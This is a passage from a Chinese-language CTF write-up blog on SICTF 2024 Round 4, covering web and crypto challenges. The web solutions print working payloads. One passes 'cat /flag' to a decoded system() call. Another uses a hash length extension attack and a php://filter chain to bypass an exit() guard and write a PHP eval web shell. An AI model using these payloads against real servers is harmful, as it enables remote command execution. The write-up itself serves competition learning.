<span class="variable">$s</span>[<span class="number">47</span>] . <span class="variable">$s</span>[<span class="number">47</span>];</span><br><span class="line"><span class="variable">$e</span> = <span class="variable">$payload</span> = <span class="variable">$s</span>[<span class="number">115</span>].<span class="variable">$s</span>[<span class="number">65</span>].<span class="variable">$s</span>[<span class="number">86</span>].<span class="variable">$s</span>[<span class="number">39</span>].<span class="variable">$s</span>[<span class="number">70</span>].<span class="variable">$s</span>[<span class="number">4</span>].<span class="variable">$s</span>[<span class="number">108</span>].<span class="variable">$s</span>[<span class="number">124</span>].<span class="variable">$s</span>[<span class="number">26</span>].<span class="variable">$s</span>[<span class="number">65</span>].<span class="variable">$s</span>[<span class="number">16</span>].<span class="variable">$s</span>[<span class="number">116</span>].<span class="variable">$s</span>[<span class="number">115</span>].<span class="variable">$s</span>[<span class="number">103</span>].<span class="variable">$s</span>[<span class="number">98</span>].<span class="variable">$s</span>[<span class="number">77</span>].<span class="variable">$s</span>[<span class="number">92</span>].<span class="variable">$s</span>[<span class="number">48</span>].<span class="variable">$s</span>[<span class="number">12</span>].<span class="variable">$s</span>[<span class="number">44</span>].<span class="variable">$s</span>[<span class="number">115</span>].<span class="variable">$s</span>[<span class="number">62</span>].<span class="variable">$s</span>[<span class="number">58</span>].<span class="variable">$s</span>[<span class="number">55</span>].<span class="variable">$s</span>[<span class="number">92</span>].<span class="variable">$s</span>[<span class="number">37</span>].<span class="variable">$s</span>[<span class="number">55</span>].<span class="variable">$s</span>[<span class="number">40</span>].<span class="variable">$s</span>[<span class="number">116</span>].<span class="variable">$s</span>[<span class="number">71</span>].<span class="variable">$s</span>[<span class="number">16</span>].<span class="variable">$s</span>[<span class="number">83</span>].<span class="variable">$s</span>[<span class="number">92</span>].<span class="variable">$s</span>[<span class="number">48</span>].<span class="variable">$s</span>[<span class="number">75</span>].<span class="variable">$s</span>[<span class="number">23</span>].<span class="variable">$s</span>[<span class="number">5</span>].<span class="variable">$s</span>[<span class="number">74</span>].<span class="variable">$s</span>[<span class="number">47</span>].<span class="variable">$s</span>[<span class="number">47</span>];</span><br><span class="line"><span class="variable">$f</span> = <span class="variable">$a</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$g</span> = <span class="variable">$a</span>(<span class="variable">$a</span>(<span class="variable">$e</span>));</span><br><span class="line"><span class="variable">$h</span> = <span class="variable">$s</span>[<span class="number">17</span>].<span class="variable">$s</span>[<span class="number">130</span>].<span class="variable">$s</span>[<span class="number">106</span>].<span class="variable">$s</span>[<span class="number">76</span>].<span class="variable">$s</span>[<span class="number">113</span>].<span class="variable">$s</span>[<span class="number">68</span>].<span class="variable">$s</span>[<span class="number">75</span>].<span class="variable">$s</span>[<span class="number">109</span>].<span class="variable">$s</span>[<span class="number">55</span>].<span class="variable">$s</span>[<span class="number">65</span>].<span class="variable">$s</span>[<span class="number">26</span>].<span class="variable">$s</span>[<span class="number">47</span>];</span><br><span class="line"><span class="variable">$i</span> = <span class="variable">$a</span>(<span class="variable">$a</span>(<span class="variable">$h</span>));</span><br><span class="line"><span class="comment">//$i($f()[$a($c)][$g]); </span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$a</span>,<span class="variable">$b</span>,<span class="variable">$c</span>,<span class="variable">$e</span>,<span class="variable">$f</span>,<span class="variable">$g</span>,<span class="variable">$h</span>,<span class="variable">$i</span>);</span><br></pre></td></tr></table></figure>

<p>加密执行，解密以后是</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">system</span>(<span class="title function_ invoke__">get_defined_vars</span>()[_GET][W3lc0me_t0_SICTF.<span class="number">2024</span>]);</span><br></pre></td></tr></table></figure>

<p>直接GET传参</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?W3lc0me[t0_SICTF.2024=cat /flag</span><br></pre></td></tr></table></figure>

<p>命令执行，这里.号属于特殊字符，用 [ 来绕过php7以下的变量名特殊字符自动转换</p>
<h3 id="Die-for-now"><a href="#Die-for-now" class="headerlink" title="Die for now"></a><strong>Die for now</strong></h3><p>看一眼</p>
<p><img src="/2024/11/06/SICTF-2024-round4/14.jpg" alt="img"></p>
<p>哈希长度扩展攻击，试一下</p>
<p>工具链接：<a target="_blank" rel="noopener" href="https://github.com/shellfeel/hash-ext-attack">https://github.com/shellfeel/hash-ext-attack</a></p>
<p>123.txt带出secret.php的值</p>
<p><img src="/2024/11/06/SICTF-2024-round4/15.jpg" alt="img"></p>
<p>传参</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hash=b7dd1b3c6b6dcc52a01f808e31e9d21c&amp;content=gAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcAAAAAAAAAAxW1sxMjMudHh0</span><br></pre></td></tr></table></figure>

<p>查看123.txt</p>
<p><img src="/2024/11/06/SICTF-2024-round4/16.png" alt="img"></p>
<p>死亡代码绕过</p>
<p>可以参考这篇博客：</p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/202510#h3-18">探索php:&#x2F;&#x2F;filter在实战当中的奇技淫巧-安全客 - 安全资讯平台</a></p>
<p>Bypass</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">exit</span>(); </span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/write=string.strip_tags|convert.base64-decode/resource=?&gt;PD9waHAgQGV2YWwoJF9QT1NUW1FmdG1dKT8+/../Qftm.php</span><br></pre></td></tr></table></figure>

<p>这里base64四位解码，直接破坏&lt;?等符号结构，绕过死亡代码后传马，命令执行</p>
<p>Payload:</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hash=d698e9ead3bbf847e4b83c78731e7400&amp;content=gAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAcAAAAAAAAAAxW1twaHA6Ly9maWx0ZXIvd3JpdGU9c3RyaW5nLnN0cmlwX3RhZ3N8Y29udmVydC5iYXNlNjQtZGVjb2RlL3Jlc291cmNlPT8+UEQ5d2FIQWdRR1YyWVd3b0pGOVFUMU5VVzFGbWRHMWRLVDgrLy4uL1FmdG0ucGhw</span><br></pre></td></tr></table></figure>

<p> 访问Qftm.php，传参命令执行</p>
<p><img src="/2024/11/06/SICTF-2024-round4/17.jpg" alt="img"></p>
<h2 id="Crypto-3-4"><a href="#Crypto-3-4" class="headerlink" title="Crypto(3&#x2F;4)"></a><strong>Crypto(3&#x2F;4)</strong></h2><h3 id="SignBase"><a href="#SignBase" class="headerlink" title="SignBase"></a><strong>SignBase</strong></h3><p>简单题，base64解码拿flag</p>
<h3 id="Smooth"><a href="#Smooth" class="headerlink" title="Smooth"></a><strong>Smooth</strong></h3><p>看题目名和内容，应该是RSA p-1光滑，可以参考这篇文章</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_62506844/article/details/125774485?app_version=6.3.8&code=app_1562916241&csdn_share_tail=%7B%22type%22:%22blog%22,%22rType%22:%22article%22,%22rId%22:%22125774485%22,%22source%22:%222301_80093366%22%7D&uLinkId=usr1mkqgl919blen&utm_source=app">RSA p+1或p-1光滑_p-1光滑数-CSDN博客</a></p>
<p>直接贴exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2 </span><br><span class="line">N = <span class="number">11353462911659482113796537452147300926058319193410149519981293344545095869273822230953023429933867057788424748612924709948861133348747189832397098293375764081790597820832766019459982124608221261607650511397189714784056313299551817534654742174637343804047231232241364089289257964139944018168155573510980260130960125621306919129390727418251555408239157881843225479158237727969284756513805560836003067115936987292751142016846824024901372913577548599978847860303760659677939193351221798796221804998385095596961591093782162020167439948314063423204757741472210008357888290333170757522814768955797167174930629344666183821709125207308525214263797625499327774875517941662523738827284067304929843343871569023248931759251331056863803201916908875256305736551124386988450879913404808869417817363510363373493093139804372817316366990863872781848240937733101758906281563575413208242901819275013539759479445299894840593737457394207415306989963459347994339058584475533786264375696277942369426844216474662828121334192775480587740071776080691560820922589751966526187341539255661442517814436944781114380877453502120302247547983180059537220197840688418898830571100216529994749464486853212098379822895838120836692532849021875818941979891105837972315129986493</span></span><br><span class="line">c = <span class="number">4598142980961588614870523368474306387497434303187254927457676265871592231881441246092917258758503624096206624791819316260705668875764048374035213672138915662719877795747211803584360349151646264274341548770123417923229997374982757324397146348908248704115062655445309042278469908831635522908894918382861563762003781223067210316435231509359575745828484177064520417698784251000631935361105284031848497200100561554984257265297077176545082009710252149167922123535451717313588884862304552508619154651546264753192894485610685402565486840707709012364088270364787452130288293053818329408433642977483320525542674345001200312959241276966417288770125166249156122793451000156544563900072606708005901579238109781720805374132101363788622676000360345128868422751829657184702090198806325558601552728909032627597688702884484377994243047876011323705947461799669488497113582621976154428096812072612119422667669321557427061098391558516935530727451865151957035156100271891977310043273298085691419672779758845492888551759393825925266903887942750052210444677062600227218953570162640164207895883301679126000642791876167281967081725589618329012476305157314322062703122134504285038691938912783524944917966615556902938825590064899700174139252191278691620663355243</span></span><br><span class="line">e=<span class="number">0x10001</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">a = <span class="number">2</span></span><br><span class="line">n = <span class="number">2</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    a = <span class="built_in">pow</span>(a, n, N)</span><br><span class="line">    res = gmpy2.gcd(a-<span class="number">1</span>, N)</span><br><span class="line">    <span class="keyword">if</span> res != <span class="number">1</span> <span class="keyword">and</span> res != N:</span><br><span class="line">        q = N // res</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;n=&quot;</span>,n)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;p=&quot;</span>,res)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;q=&quot;</span>,q)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    n += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">d=gmpy2.invert(e,(res-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">m=<span class="built_in">pow</span>(c,d,N)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"></span><br><span class="line"><span class="comment">#SICTF&#123;d8af7f58-49f7-490d-be49-386b8ff16361&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="next-prime"><a href="#next-prime" class="headerlink" title="next_prime"></a><strong>next_prime</strong></h3><p>解方程组，p q挨得很近，可以用费马分解</p>
<p>2021年“绿城杯”网络安全大赛-Crypto-RSA2-PLUS原题脚本能直接打</p>
<p>exp如下：</p>
<p>先分解</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fermat_factorization</span>(<span class="params">n</span>):</span><br><span class="line">    factor_list = []</span><br><span class="line">    a = gmpy2.iroot(n, <span class="number">2</span>)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        a += <span class="number">1</span></span><br><span class="line">        b2 = a * a - n</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> gmpy2.is_square(b2):</span><br><span class="line">            b2 = gmpy2.mpz(b2)</span><br><span class="line">            b, xflag = gmpy2.iroot(b2, <span class="number">2</span>)</span><br><span class="line">            <span class="keyword">assert</span> xflag</span><br><span class="line">            factor_list.append([a + b, a - b])</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(factor_list) == <span class="number">2</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> factor_list</span><br><span class="line"></span><br><span class="line">n1 = <span class="number">143003048136494625720615623612005913472507924053937690079082986485649969355472743235179770036996193641198750946508667945561623931811236977039763581123681134310890547763107653222776992418543178066390387385209825190685606728024120446212807710589806258669458993047631033905702244902809204039169931629358263456702579067559691338668237882496453568585374905432631312417129535623987837367199215661733043851565981435234933986864857569158677737153423060041120732727135186371678287680926662892691327401787213342106281956461499522723795617869239148528294553548775690229067500104867437905746412645684721821428282431567702986879179533855920546700706123995719114359958306882907020982377260255340490340263938995699635287224549324332962230238510191824829224191551900441011605052418697617085549543103391184965537110312684637038510114533398510307173011690076219892318860903556489256383303693074652155424333388152193775840529985682153395008472897617946636734810609200156268438329402662168752285341847607694230848883249991722691539384542468611397615969487669898094687344847452861774236267516878551680397732564006255256825307533960791695267034807439791627895625581061889926276814228469856614838307012696777026973517086921078389474757196549594972814371353</span></span><br><span class="line"></span><br><span class="line">factor_list = fermat_factorization(n1)</span><br><span class="line">X1, Y1 = factor_list[<span class="number">0</span>]</span><br><span class="line">X2, Y2 = factor_list[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> X1 * Y1 == n1</span><br><span class="line"><span class="keyword">assert</span> X2 * Y2 == n1</span><br><span class="line"></span><br><span class="line">p = gmpy2.gcd(X1, X2)</span><br><span class="line">q = X1 // p</span><br><span class="line">p1 = gmpy2.gcd(Y1, Y2)</span><br><span class="line">q1 = Y1 // p1</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;p =&#x27;</span>, p)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;q =&#x27;</span>, q)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;p1 =&#x27;</span>, p1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;q1 =&#x27;</span>, q1)</span><br></pre></td></tr></table></figure>

<p>拿到两组p q，常规RSA解密，慢慢试，拿到flag</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">q = <span class="number">113787980601251745826843877382579552614648689857848904057572059325440944465611640163147176996118167635079365778546506624499634252375260044431411000949865475313224316650494893792164068973839036934191662707067777255376224926590339831443832304095551258919095844512924220523460823214952758504127950314742622077043</span></span><br><span class="line">p = <span class="number">105093597128835439479657061236111691975605383355129363600351480053850707028369723338526666770974606911527798737164915958103082313581695026637245098382021718070694325314274439104912172972661654273602405666361761211778169903604127876997716201210879207713092042764119984813765613769539486499321202923341006511223</span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">10602368727908312334676265892975307612231309319511015017178654564186172749979627738052483995870388025140270600159107954524376993980949045647370337520644299969292550299798129717198074042121264370311983929042594290226321121639097714569204574387632530578153623781118813035223106106430716561113649761388347227207862016222328885951443891878767280730866193302995220736592745950808566359750940949520997722511969961743175777398751576595421456387998438214806188903746057855596476380404784738717555105866919649086601807350830108805521710188675565963765427930594177874353694184805979235854934856122125278853834603734029710968348</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># n = 40600296529065757616876034307502386207424439675894291036278463517602256790833</span></span><br><span class="line">n = q*p</span><br><span class="line"><span class="comment"># print(n)</span></span><br><span class="line">d = gmpy2.invert(e, (p -<span class="number">1</span>) * (q-<span class="number">1</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;d=&quot;</span>,d)</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;m=&quot;</span>,m)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"></span><br><span class="line"><span class="comment">#SICTF&#123;f2a3af27-ad07-4fc2-9b69-a91304eee6a3&#125;</span></span><br></pre></td></tr></table></figure>


    </div>

    
    
    

      <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/misc/" rel="tag"># misc</a>
              <a href="/tags/web/" rel="tag"># web</a>
              <a href="/tags/crypto/" rel="tag"># crypto</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2024/11/05/2024%E5%AE%89%E5%BE%BD%E7%9C%81%E5%88%86%E5%B8%83%E5%BC%8F/" rel="prev" title="2024安徽省分布式">
      <i class="fa fa-chevron-left"></i> 2024安徽省分布式
    </a></div>
      <div class="post-nav-item"></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#SICTF-2024-Round-4"><span class="nav-number">1.</span> <span class="nav-text">SICTF 2024 #Round 4</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Misc-5-5"><span class="nav-number">1.1.</span> <span class="nav-text">Misc(5&#x2F;5)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AD%BE%E5%88%B0"><span class="nav-number">1.1.1.</span> <span class="nav-text">签到!</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B4%BE%E6%A3%AE"><span class="nav-number">1.1.2.</span> <span class="nav-text">派森</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A8%A1%E5%9E%8B%E7%9A%84%E7%A7%98%E5%AF%86"><span class="nav-number">1.1.3.</span> <span class="nav-text">模型的秘密</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Picture"><span class="nav-number">1.1.4.</span> <span class="nav-text">Picture</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A4%96%E6%98%9F%E4%BF%A1%E5%8F%B7-Ultra"><span class="nav-number">1.1.5.</span> <span class="nav-text">外星信号 Ultra</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Web-3-4"><span class="nav-number">1.2.</span> <span class="nav-text">Web(3&#x2F;4)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Upl0ad"><span class="nav-number">1.2.1.</span> <span class="nav-text">Upl0ad</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Sighin"><span class="nav-number">1.2.2.</span> <span class="nav-text">Sighin</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Die-for-now"><span class="nav-number">1.2.3.</span> <span class="nav-text">Die for now</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Crypto-3-4"><span class="nav-number">1.3.</span> <span class="nav-text">Crypto(3&#x2F;4)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#SignBase"><span class="nav-number">1.3.1.</span> <span class="nav-text">SignBase</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Smooth"><span class="nav-number">1.3.2.</span> <span class="nav-text">Smooth</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#next-prime"><span class="nav-number">1.3.3.</span> <span class="nav-text">next_prime</span></a></li></ol></li></ol></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="星潭月音"
      src="/images/avatar.jpg">
  <p class="site-author-name" itemprop="name">星潭月音</p>
  <div class="site-description" itemprop="description">CTF</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">3</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">3</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">3</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2024</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">星潭月音</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
    <span title="站点总字数">15k</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="站点阅读时长">13 分钟</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  




  
<script src="/js/local-search.js"></script>













  

  


  <script async src="/js/cursor/fireworks.js"></script>


</body>
</html>